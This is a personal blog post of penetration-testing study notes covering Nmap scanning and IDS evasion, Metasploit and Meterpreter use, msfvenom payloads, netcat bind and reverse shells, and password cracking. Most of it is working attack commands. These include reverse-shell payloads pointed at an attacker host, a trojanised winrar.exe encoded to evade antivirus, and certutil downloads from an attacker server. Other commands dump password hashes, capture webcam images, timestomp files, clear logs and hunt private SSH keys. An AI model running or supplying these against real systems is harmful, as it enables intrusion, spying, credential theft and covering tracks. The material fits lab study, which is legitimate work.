---
title: "Nmap Basics"
date: 2025-08-11 00:00:00 +0800
categories: [CTPS]
tags: [Nmap]
---

# Hello World

Hello World, this is my 1st eprsonal blog!

## Tools

### **PiP**

```bash
python3 -m venv venv
source venv/bin/activate
deactivate
```

### Nmap

---

- Pictures, `<`reference`>`
    

<aside>

**ls -la /usr/share/nmap/scripts/ | grep -e "<service_name>"**

</aside>

```bash
**Command:**

**nmap <ip> [   FLAG   ]**

**# Flags #**

-PS # Ping Sweep

-PE # (ICMP requests, echo)

-Pn  # Discover ALL live ports (mainly for windows) .. *-Pn -> No ping/host discovery*

-sn # Host Discovery .. *-sn --> "No Port Scan"*

-sT # TCP full-connnect scan *"Reliable"*

-sU # UDP Ping

-sP -PA # TCP-ACK Ping

-sS # SYN-ACK Stealthy and Fast scan .. doesn't open full TCP connection *"Requires root privileges"*

-PA # ACK Pings (doesn’t work that great, because most firewalls block packets that includes “ACK” flag)

-F # Fast port Scanning, checks most 100 ports.

-n # (No DNS Resolution) - Faster scan when DNS resolution is unnecessary.

-O -n # OS detection

-A -n # Aggressive - OS detection, Version detection, Script scanning, and traceroute

-O --osscan-guess # Aggressively guessing

-sV # To check Service Version
-sV --version-intensity 8 # Aggressively guessing.

'
  **Nmap Script Engines**  *>>*  /usr/share/nmap/scripts
'
# To know more about a particular script:
--script-help=**<script-name.se>**

--script=**<category>** # To specify Script Category

--script=ftp-*    # To run all scripts regarding a specific service .. **Wildcard** will pick everything related to FTP for example.

# You can target more than one host using nmap like
nmap <ip1> <ip2> 

# Or alternatively, you can:
vim targets.txt # That includes the IP's
nmap -iL targets.txt 

**## Firewall Detection, IDS Evasion ##**

-sA # In Windows if returned "**unfiltered**" that means firewall is OFF
  
--ttl <value> # set IP Time-To-Live field

# we can determine the target’s OS by the TTL of the ping response when using the "--packet-trace" flag
   - windows: TTL=128
   - linux: TTL=64
sudo nmap 10.129.2.18 -sn -oA host -PE **--packet-trace** --disable-arp-ping 
            
            Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:12 CEST
            SENT (0.0107s) ICMP [10.10.14.2 > 10.129.2.18 Echo request (type=8/code=0) id=13607 seq=0] IP [ttl=255 id=23541 iplen=28 ]
            RCVD (0.0152s) ICMP [10.129.2.18 > 10.10.14.2 **Echo reply (type=0/code=0) id=13607 seq=0] IP [ttl=128 id=40622 iplen=28 ]**

# **Fragmenting Packets** (Network level)
# Note: Doesn't work with TCP connect scan or Version Detection, **works with SYN(half) Scan ONLY**, eg: -sS
nmap <IP> -sS -f
nmap <IP> -f --mtu=8 # Means *"min transmission unit"* smallest packet size would be 8. 

# **Decoy - M**aking target not knowing who's the sender (Firewall/IDS Evasion and Spoofing)
nmap -sS -D <IP> 
nmap -sS -D <Decoy_IP#1>, <Decoy_IP#2>, <Decoy_IP#3>, **<Attacker_IP> <Victim_IP>**

# To change the source port, to also confuse the target more.
nmap <IP> -g <Spoofed_port> -sS -p <Destination_port>

# Specifying Data length
nmap <IP> --data-length=200  # 200 For Example.

# **Optimzing Time**
# Defining how periods of time the status should be shown. Here we can specify the number of seconds (s) or minutes (m), after which we want to get the status.
--stats-every=5s

# Delaying (Sometimes we slow it down, because target's machine might be weak, causing Unattended DoS)
nmap <IP> -sS --scan-delay <value>s # Like 5s

# Setting Timeout
nmap <IP> --host-timeout <value>s**[**;<value>m;<value>h**]** # Like 5s

# Setting Time Template
nmap <IP> -T<0-5> # From lowest(0) to highset(5)

**# Filtered Ports**
- Indicated when no response is received (e.g., *firewall drops packets*).
nmap --reason -p 445 <target>

- Evasion:
Options like disabling DNS resolution (**-n**) or using specific flags for stealth

**# Performance Optimization**
- Adjust Scan Speed:
Timeouts: --min-rtt-timeout, --max-rtt-timeout.
Retries: --max-retries <value>.

Parallelism:
Use **--min-parallelism** and **--max-parallelism** to control packet frequency.

## **Nmap Output ##**
# Outputting in a normal format
nmap .... -oN <filename>.txt 

# Outputting in a xml format (to input into msfconsole db)
nmap .... -oN <filename>.xml 
'					**service postgresql start** && msfconsole -q
                    > workspace -a <workspace-name>
                    > db_status
                    > db_import /PATH-TO-SCAN-RESULTS/SCAN.xml
                    > hosts
                    > services
                    > db_nmap <ip> -Pn -A -sS
'
# Visualizing Scans
    - use the -oX option to save output as xml
    - then use the *xsltproc* tool to convert the scan to an html report:
xsltproc target.xml -o target.html

# Outputting in a Script Kiddo format
nmap .... -oS <filename>

# Outputting in a Grepable output
nmap ... -oG <filename>

**# Opening Wireshark:**
sudo wireshark -i eth0 # (to force opening with eth0)

**# Port Satatus:**
    - ‘**open**’ → means we can establish a connection to the port
    - ‘**filtered**’ → error or no response from the port or a firewall
    - ‘**unfiltered**’ → cannot determine if port is open or not
    - ‘**open|filtered**’ → potentially a firewall or packet filter on port

` If you get *filtered* state, that means there's a firewall in target's machine `
```

### Metasploit Framework

### Metasploit Basics

Follow more on “Metasploit: The Penetration Tester’s Guide” Book

- **Meterpreter Help Commands**
    
    ```bash
    **# Displays the Meterpreter help menu.**
    `meterpreter` > help or ?
    
    `meterpreter` > show options
    
    `meterpreter` > show advanced
    
    `meterpreter` > services
    
    # Shows active channels.
    `meterpreter` > channel
    
    # Sends the current session to the background and returns to the `msf` prompt.
    `meterpreter` > background
    
    # Displays the content of a file
    `meterpreter` > cat file.txt
    
    # Opens a file on the target host using the `vim` editor.
    `meterpreter` > edit file.txt
    
    # List (`ls`), Change (`cd`) and Display (`pwd`) the current working directory on the target host.
    `meterpreter` > ls or *#* **lls** *for present working directory of the local (Attacker) machine*
    `meterpreter` > pwd or *#* **lpwd**
    `meterpreter` > cd /path/to/directory  or *#* **lcd**
    
    # Print checksum of file
    `meterpreter` > checksum md5 /bin/bash
    
    # Check the PATH environment variable on 
    `meterpreter` > getenv PATH
    
    # Displays the user the Meterpreter server is running as.
    `meterpreter` > getuid
    
    # Displays the user's idle time on the remote machine.
    `meterpreter` > idletime
    
    # Displays network interfaces and addresses on the remote machine.
    `meterpreter` > ipconfig
    
    # Downloads a file from the remote Windows machine.
    `meterpreter` > download C:\\path\\to\\file
    
    # Uploads a file to the remote machine.
    `meterpreter` > upload /path/to/local/file c:\\remote\\path
    
    # Runs a command on the target.
    `meterpreter` > execute -f cmd.exe -i -H
    
    # Provides a standard shell on the target system.
    `meterpreter` > shell
    
    # Displays all list of running processes on the target.
    `meterpreter` > ps aux
    
    # To get an exact process number
    `meterpreter` > pgrep <process_Name>
    
    # To migrate to another process
    `meterpreter` > migrate <process_Number>
    **# or**
    `meterpreter` > run post/windows/manage/migrate
    
    # Dumps the contents of the SAM database.
    `meterpreter` > use priv
    `meterpreter` > run post/windows/gather/hashdump
    
    # Locates specific files on the target host.
    `meterpreter` > search -f *.doc
    `meterpreter` > search -d //path//to -f *testfi~~le~~*
    
    # Grab screen shots of our victim's machine
    `meterpreter` > screeenshot
    
    # Displays available webcams on the target host.
    `meterpreter` > webcam_list
    
    # Captures a picture from a connected webcam.
    `meterpreter` > webcam_snap -i 1 -v false
    
    # Executes Meterpreter instructions from a text file.
    `meterpreter` > resource path/to/file
    
    **# Privilge Escalation #**
    
    # Steal token from other users.
    `meterpreter` > steal <process_id>
    
    # Used to get back to the old user.
    `meterpreter` > rev2self
    
    # **Uictl**:This command is used to control the victim's keyboard and mouse.We can disable their keyboard or mouse remotely.
    `meterpreter` > uictl enable**\**disable keyboard**\**mouse.
    
    # **Timestomp** (Anti forensic tool): The best way to avoid forensic detection is not to access our victim's file system.
    # So we will use meterpreterIt completely resides in the memory and does not write any data on the disk. View various options:
    `meterpreter` > timestomp -h
        # 1. Use '-c' option set the creation time of a file.
        # 2. Use '-m' option to set the modificaiton time of a file.
        # 3. Use '-a' option to set the accessed time of a file.
        # And much more !
    
    # Clears the Application, System, and Security logs on a Windows system.
    `meterpreter` > clearev
    ```
    
- **Workspaces**
    
    Can be used to segregate the different scan results, hosts, infos, loot, etc.
    
    - `workspace` show the current workspace
    - `workspace -a workspace-name` add a workspace
    - `workspace -d workspace-name` delete a workspace
    - `workspace workspace-name` to switch to a workspace
    - `workspace -h` for help
    - `db_import file` to import files in our database workspace
    - `db_export -f xml file.xml` we can specify a format with -f. For help we can run `db_export -h`
    - `hosts -h` will show help on the hosts command that we can use to see stored info in the db about the hosts.
    - `services -h` same as host but for services
    - `creds -h` same but for stored credentials
    - `loot -h` The loot command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.
- **Information Gathering & Enumeration**
    
    ```bash
    **# Importing Nmap Scan Results Into MSF**
    
    nmap <ip> -Pn -sV -O -oX SCAN.xml
    
    **service postgresql start** && msfconsole -q
    db_status
    db_import /PATH-TO-SCAN-RESULTS/SCAN.xml
    
    hosts
    
    services
    
    -------------------------------------
    
    **# T1046 : Network Service Scanning**
    nmap <ip>
    
    # Target running port 80
    curl <ip> # It's XODA!
    
    # Exploit with MSF
    msfconsole
      use exploit/unix/webapp/xoda_file_upload
      set RHOSTS <ip> # Target 1
      set TARGETURI /
      exploit
    
    # Start a command shell and identify the IP address range of the second target machine.
    shell
    ip addr # Copy ip of the target 1 in other network (ie. 192.75.101.2)
    # **Ctrl Z** to get back to meterpreter
    
    # Add the route to metasploit's routing table
    run autoroute -s <ip> # IP of Target 1 in other network (ie. 192.75.101.2)
    
    # **Background the current meterpreter session** and use the portscan tcp module of metasploit to scan the Target 2 (ie. 192.75.101.3).
    use auxiliary/scanner/portscan/tcp
    set RHOSTS <ip> # **Target 2** (ie. 192.75.101.3)
    set verbose true
    set ports 1-1000
    exploit
    
    # Check the static binaries available in "/root/tools/static-binaries" directory.
    ls -l /root/tools/static-binaries
    
    **# Background the metasploit session and create a bash port scanning script.**
    # Create a bash script to scan first 1000 ports, use https://catonmat.net/tcp-port-scanner-in-bash as a reference
                    #!/bin/bash
                    for port in {1..1000}; do
                        timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null &&
                        echo "port $port is open!"
                    done
    
    # Foreground the metasploit
    fg
    sessions -i <session_id>
    
    # Upload the nmap static binary and the bash port scanner script to the target machine.
    upload /root/tools/static-binaries/nmap /tmp/nmap
    upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
    
    # Make the binary and script executable and use the bash script to scan the second target machine.
    shell
    cd /tmp/
    chmod +x ./nmap ./bash-port-scanner.sh
    ./bash-port-scanner.sh <ip> # (ie. 192.75.101.3)
    
    # Using the nmap binary, scan the target machine for open ports.
    ./nmap -p- <ip> # (ie. 192.75.101.3)
    ```
    
- **MSF Vulnerability Scanning**
    
    ```bash
    # Nmap scan using MSF
    **service postgresql start** && msfconsole -q
    db_status
    setg rhosts <ip>
    setg rhost <ip>
    workspace -a SMTP_ENUM
    db_nmap <ip> -Pn -A -sS
    
    hosts # List hosts
    
    services # List services
    
    # Search for port service exploit using MSF
    search type:exploit name:Microsoft IIS # You can change type and name
    
    # Search for port service exploit using Searchsploit
    searchsploit "Microsoft IIS"
    
    # Search for port service exploit using Searchsploit that only show Metasploit modules
    searchsploit "Microsoft IIS" | grep -e "Metasploit"
    
    -------------------------------------
    
    **# Metasploit-Autopwn ?**
    wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
    cd metasploit-autopwn
    cp db_autopwn.rb /usr/share/metasploit-framework/plugins
    
    # Do this after import nmap scan to MSF
    msfconsole
    service postgresql start
    load db_autopwn
    db_autopwn
    
    # Search for exploit for open ports on Target
    db_autopwn -p -t
    
    # Search for exploit for only specified open port on Target
    db_autopwn -p -t -PI <port>
    
    # List vulnerabilities for srviece port
    analyze
    vulns
    ```
    
- **Automating Metasploit with Resource Scripts (.rc)**
    
    ```bash
    **# Saving History Commands to a Resource Script**
    # If the exploitation has been manually conducted, we can use makerc command to save all of the history commands in the resource script exploit_17010.rc.
    **msf5 exploit** **>** makerc exploit_17010.rc
    
    **# Creating a Resource Script from scratch**
    # Sometimes, we do have the beforehand exploitation. We can create a resource script file first.
    **u@kali:~$** touch exploit_17010.rc
    # Then, we type in all of the msfconsole commands that we need for exploitation. We can use any of our preferred text editor like nano or vim to do this.
    
                use exploit/windows/smb/ms17_010_eternalblue
                set RHOSTS 192.168.0.12
                set LHOST 192.168.0.11
                exploit -j
    
    # We especially add an additional parameter exploit -j in the final command.
    # It makes exploit run as a background job, which means after exploitation is completed, the shell will be maintained in the background.
    # This is commonly used for multiple exploitations so that the system can resume after one successful shell is opened.
    # To find the background shells, we can use the command sessions to list the active sessions and interact with them utilizing sessions -i Id.
    
    **# So far so good. And now we may come up with some ideas like:**
    *## Can we make the scripts more customizable by passing the target IP address during runtime? ##*
    
    # Unfortunately, resource scripts can not receive the arguments directly. We need to embed ruby blocks in the scripts to process the arguments.
    # If only one single target is passed, we can utilize the environment variable to pass the IP address.
    
    <ruby>
    run_single("set RHOSTS #{ENV['TARGET']}")
    </ruby>
    
    # Here, the code block refers to an environment variable called “TARGET”. Before running the resource script, the variable named “TARGET” should be set.
    **u@kali:~$** export TARGET=192.168.0.12
    # If we need to automatically exploit multiple targets at one time, we can save the targets in one file (targets.txt) and use the file reading function in Ruby to iterate through each target.
    
    <ruby>
    File.foreach("targets.txt", "\n"){|target_IP| run_single("set RHOSTS 
    #{target_IP}")}
    </ruby>
    
    # For example, the file “targets.txt” contains multiple target IP addresses like this form:
                192.168.0.12
                192.168.0.13
                ...snip...
    # The resource script file is presented below.
    
    **# Running Resource Scripts**
    # We can run the scripts in two ways. The first way is to run it directly from the terminal.
    **u@kali:~$** msfconsole -q -r exploit_17010.rc
    # The second way is to execute it inside the msfconsole. This method can save the console initialization time.
    
    **msf5 >** resource exploit_17010.rc
    [*] Processing /u/exploit.rc for ERB directives.
    resource (/u/exploit_17010.rc)> use exploit/windows/smb/ms17_010_eternalblue
    resource (/u/exploit_17010.rc)> set RHOSTS 192.168.0.12
    resource (/u/exploit_17010.rc)> set LHOST 192.168.0.11
    resource (/u/exploit_17010.rc)> exploit -j
    ```
    

### **Generating payloads with MSFvenom (**Client-Side Attacks)

```bash
# List MSFvenom payloads
msfvenom --list payloads

# List MSFvenom formats
msfvenom --list formats

**# Generate Android payload
#Terminal 1:**
playit
msfvenom -p android/meterpreter/reverse_tcp LHOST=<playit.gg_ip> LPORT=<playit.gg_port> -o /home/kali/Desktop/android_payload.apk
**#Terminal 2:**
 msfconsole -q
    use exploit/multi/handler
    set payload android/meterpreter/reverse_tcp
    set LHOST 0.0.0.0
    set LPORT 4444    # "kali" (playit.gg)
    exploit

**# MOVE TO THE SAME DESTINATION!**
sudo apt install openjdk-11-jdk
sudo update-alternatives --config java  # Choose the last one

sudo apt install zipalign

keytool -genkeypair -alias myalias -keyalg RSA -keysize 2048 -validity 10000 -keystore mykeystore.jks

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykeystore.jks <APK_NAME>.apk myalias

# **Verify the keystore** - After signing the APK, it’s a good practice to verify that the APK is signed properly
sudo jarsigner -verify -verbose -certs <APK_NAME>.apk

zipalign -v 4 <APK_NAME>.apk <NEW_NAME>.apk
# Alternative:
wget http://ftp.de.debian.org/debian/pool/main/a/android-platform-build/zipalign_8.1.0+r23-2_amd64.deb
sudo apt-get install zipalign
sudo apt install ./zipalign_*_amd64.deb
zipalign -v 4 <APK_NAME>.apk <NEW_NAME>.apk

# Generate 32bit windows payload   **# -a -> architecture,   -p -> payload,   -f -> format**
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<Attacker_ip> LPORT=<port> -f exe > ~/Desktop/windows_payloadx86.exe

# Generate 64bit windows payload
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_ip> LPORT=<port> -f exe > ~/Desktop/windows_payloadx64.exe

# Generate 32bit linux payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Attacker_ip> LPORT=<port> -f elf > ~/Desktop/linux_payloadx86

# Generate 64bit linux payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Attacker_ip> LPORT=<port> -f elf > ~/Desktop/linux_payloadx64

**__________________________________________**
 **# Host internal Web Server**
 **python -m SimpleHTTPServer 80** # Python2
 # OR
 **python -m http.server 80** # Python3
 
 # Set up listener/handler to receive the reverse connection back from target system
 msfconsole -q
   use multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <Attacker_ip>
   set LPORT <port>
   exploit
**_________________________________________**

**# Encoding payloads with MSFvenom**

# List MSFvenom encoders
msfvenom --list encoders

# Encode 32bit windows payload with shikata_ga_nai (1 iteration only)             **# -e -> encode, -i -> iteration**
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<Attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -f exe > ~/Desktop/windows_encoded_payloadx86.exe

# Encode 32bit windows payload with shikata_ga_nai (10 iteration)
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<Attacker_ip> LPORT=<port> -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/windows_encoded_payloadx86.exe

# Generate 32bit linux payload with shikata_ga_nai (10 iteration)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Attacker_ip> LPORT=<port> -i 10 -e x86/shikata_ga_nai -f elf > ~/Desktop/linux_encoded_payloadx86

============================================

**# Injecting 32bit windows payloads into windows portable executables**

# We will use winrar.exe                                                            **# -x -> no func. (custom executable file)**
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<Attacker_ip> LPORT=<port> -i 10 -e x86/shikata_ga_nai -f exe -x > ~/Downloads/wrar602.exe > ~/Desktop/winrar.exe

# Injecting 32bit windows payloads into winrar while keeping functionality          **# -k -> maintain actual func. (preserve and inject payload as a new thread)**
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<Attacker_ip> LPORT=<port> -i 10 -e x86/shikata_ga_nai -f exe -x -k > ~/Downloads/wrar602.exe > ~/Desktop/winrar.exe

============================================

# When uploading the payload to VirusTotal we see that it is still detected by antiviruses even with several layers of encryption.
# Alternatively, Metasploit offers a tool called **msf-virustotal** that we can use with an API key to analyze our payloads.

msf-virustotal -k <API key> -f TeamViewerInstall.exe

    [*] Using API key: <API key>
    [*] Please wait while I upload TeamViewerInstall.exe...
    [*] VirusTotal: Scan request successfully queued, come back later for the report
    [*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130
    [*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9
    [*] Sample SHA256 hash : 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
    [*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1651750343
    [*] Requesting the report...
    [*] Received code -2. Waiting for another 60 seconds...
    [*] Received code -2. Waiting for another 60 seconds...
    [*] Received code -2. Waiting for another 60 seconds...
    [*] Received code -2. Waiting for another 60 seconds...
    [*] Received code -2. Waiting for another 60 seconds...
    [*] Received code -2. Waiting for another 60 seconds...
    [*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
    ==================================================================================================================
    
     Antivirus             Detected  Version              Result                              Update
     ---------             --------  -------              ------                              ------
     ALYac                 true      1.1.3.1              Trojan.CryptZ.Gen                   20220505
     APEX                  true      6.288                Malicious                           20220504
     AVG                   true      21.1.5827.0          Win32:SwPatch [Wrm]                 20220505
     Acronis               true      1.2.0.108            suspicious                          20220426
     Ad-Aware              true      3.0.21.193           Trojan.CryptZ.Gen                   20220505
     AhnLab-V3             true      3.21.3.10230         Trojan/Win32.Shell.R1283            20220505
     Alibaba               false     0.3.0.5                                                  20190527
     Antiy-AVL             false     3.0                                                      20220505
     Arcabit               true      1.0.0.889            Trojan.CryptZ.Gen                   20220505
     Avast                 true      21.1.5827.0          Win32:SwPatch [Wrm]                 20220505
     Avira                 true      8.3.3.14             TR/Patched.Gen2                     20220505
     Baidu                 false     1.0.0.2                                                  20190318
     BitDefender           true      7.2                  Trojan.CryptZ.Gen                   20220505
     BitDefenderTheta      true      7.2.37796.0          Gen:NN.ZexaF.34638.eq1@aC@Q!ici     20220428
     Bkav                  true      1.3.0.9899           W32.FamVT.RorenNHc.Trojan           20220505
     <------ SNIP ------>
```

### **Netcat, Bind and Reverse Shells** Fundamentals

```bash
**# Netcat Fundamentals #**

'
**# Netcat (nc) is a versatile networking tool that reads and writes data over TCP or UDP connections.
# Available on both *NIX and Windows, making it ideal for cross-platform use.**

**# Modes:**
- Client/Connect Mode: Connect to any TCP/UDP port or Netcat listener.
- Server Mode: Listen for incoming connections on a specific port.

**# Uses in Penetration Testing:**
    - Banner Grabbing
    - Port Scanning
    - File Transfers
    - Bind/Reverse Shells

**# Other Features:**
    - Acts as a TCP/UDP/SCTP/SSL client.
    - Redirects traffic via SOCKS or HTTP proxy.
    - Supports proxy chains.
    - Encrypts communication with SSL.
    - Functions as a connection broker.
'

**# Chatting - Listening**
nc –nv**lp**  <port_number>  **# TCP**
nc –nv**lup** <port_number>  **# UDP**

**# Port Scanning/Connecting**
nc –nv**z**  <ip> <port_number>  **# TCP Scan**
nc –nv**zu** <ip> <port_number>  **# UDP Scan**

# [-n]: --nodns "No DNS", indicates numeric-only IP addresses
# [-v]: Verbose Mode
# [-l]: Listen Mode **[used for listening]**
# [-z]: Zero -I/O mode **[used for scanning]**
# [-u]: UDP Port
# [-p]: Local Port

# Display the Netcat help menu
nc --help

# Try connecting to an open port on a target system
nc <ip> 80

# Enable verbose output and disable DNS resolution when connecting to a port, **more efficient!**
nc -nv <ip> 80

# Connecting to a **closed port** to see the output
nc -nv <ip> 21

# Netcat can also be used to connect to **UDP ports**
nc -nvu <ip> 161

**## Transferring the Netcat executable to the Windows system**
# In order to analyze how Netcat works in both server and client mode, we will need to transfer the nc.exe executable to the target system running Windows
****cd /usr/share/windows-binaries
# Setup an HTTP server with Python within this directory
python -m SimpleHTTPServer 80
# Identify the IP address of your **Kali Linux system**
ifconfig
# Navigate to the target system running windows by clicking on the **Target Machine** tab at the top of the lab, and download nc.exe from the opened server
# Open up a command prompt, navigate to the Desktop directory
certutil -urlcache -f http://<Attacker_ip>/nc.exe nc.exe
# Setup a Netcat listener on the **Kali Linux** system
nc -nvlp 1234
# Connect to the Netcat listener from the Target system running **Windows** from the command line
nc -nv <Attacker_ip> 1234

**# Transferring files with Netcat**
# Create a file called **test.txt** on the Kali Linux system with some sample data
echo "Hello, this was sent over with Netcat" >> test.txt
# Setup a Netcat listener on the recipient system, which in this case is the Windows system
nc.exe -nvlp 1234 > test.txt
# On the Kali Linux system, we will need to connect to the listener and redirect the content of the test.txt file in to Netcat
nc -nv <ip> 1234 < test.txt

**-------------------------------------**

**# Bind Shells #**

# Navigating to the **/usr/share/windows-binaries** directory
cd /usr/share/windows-binaries
# Setup an HTTP server with Python within this directory
python -m SimpleHTTPServer 80
# Identify the IP address of your Kali Linux system
ifconfig
# Navigate to the target system running windows by clicking on the **Target Machine** tab at the top of the lab
# Open up a command prompt, navigate to the Desktop directory
certutil -urlcache -f http://<Attacker_ip>/nc.exe nc.exe

**# Setting up the bind shell listener**
# Setup a Netcat listener on the Windows system and configure it to execute cmd.exe when a connection is made from a client
nc.exe -nvlp 1234 -e cmd.exe
# connect to the bind shell listener running on the Windows system from the Kali Linux system
nc -nv <ip> 1234

# This process can also be reversed, for example, if we wanted to obtain a bind shell on the Kali Linux system from the Windows system, we would need to setup a Netcat listener on the Kali Linux system and configure it to execute a shell like /bin/bash.
nc -nvlp 1234 -e /bin/bash
# Connect to the bind shell listener on the Kali Linux system from the Windows system
nc.exe -nv <Attacker_ip> 1234

**-------------------------------------**

**# Reverse shell #**

# Navigating to the **/usr/share/windows-binaries** directory
cd /usr/share/windows-binaries
# Setup an HTTP server with Python within this directory
python -m SimpleHTTPServer 80
# Identify the IP address of your Kali Linux system
ifconfig
# Navigate to the target system running windows by clicking on the **Target Machine** tab at the top of the lab
# Open up a command prompt, navigate to the Desktop directory
certutil -urlcache -f http://<Attacker_ip>/nc.exe nc.exe

# Setup a Netcat listener on the Kali Linux system
nc -nvlp 1234
# Connect to the reverse shell listener on the Kali Linux system from the Windows system
nc.exe -nv <Attacker_ip> 1234

**Reverse Shell Generator: 'https://www.revshells.com/'**
```

### Cracking Protected Files

### Hunting for Encoded Files

Many different file extensions can identify these types of encrypted/encoded files. For example, a useful list can be found on [FileInfo](https://fileinfo.com/filetypes/encoded). However, for our example, we will only look at the most common files like the following:

```bash
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### Hunting for SSH Keys

```bash
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

### Encrypted SSH Keys

Most SSH keys we will find nowadays are encrypted. We can recognize this by the header of the SSH key because this shows the encryption method in use.

```bash
cat /home/john/.ssh/id_rsa

        -----BEGIN RSA PRIVATE KEY-----
        Proc-Type: 4,ENCRYPTED
        DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC
        
        8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
        4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
        ...SNIP...
```

If we see such a header in an SSH key, we will, in most cases, not be able to use it immediately without further action. This is because encrypted SSH keys are protected with a passphrase that must be entered before use. However, many are often careless in the password selection and its complexity because SSH is considered a secure protocol, and many do not know that even lightweight [AES-128-CBC](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) can be cracked.

### Cracking SSH Keys

```bash
ssh2john.py SSH.private > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

### Cracking Microsoft Office Documents

```bash
office2john.py Protected.**docx** > protected-docx.hash
john --wordlist=/usr/share/wordlists/rockyou.txt protected-docx.hash
```

### Cracking PDFs

```bash
pdf2john.py PDF.pdf > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
```

### Cracking ZIP

```bash
**# Method 1 #**

# Installation:
sudo apt update && sudo apt install fcrackzip

# Brute-Force with Wordlist:
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <protected.zip>

# Brute-Force with Incremental Mode:
fcrackzip -u -b -l 1-8 -c aA1 <protected.zip>
        **-b**    : Brute force.
        **-l 1-8**: Password length range.
        **-c aA1**: Charset (lowercase, uppercase, digits).

**# Method 2 #**
zip2john ZIP.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

### Cracking OpenSSL Encrypted Archives

```bash
for i in $(cat /usr/share/wordlists/rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

### Cracking BitLocker Encrypted Drives

```bash
bitlocker2john -i Backup.vhd > backup.hashes

grep "bitlocker\$0" backup.hashes > backup.hash

hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked

cat backup.cracked
        $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
```

Once we have cracked the password, we will be able to open the encrypted drives. The easiest way to mount a BitLocker encrypted virtual drive is to transfer it to a Windows system and mount it. To do this, we only have to double-click on the virtual drive. Since it is password protected, Windows will show us an error. After mounting, we can again double-click BitLocker to prompt us for the password.

### Hashcat `+`

https://x7331.gitbook.io/notes/htb/hashcat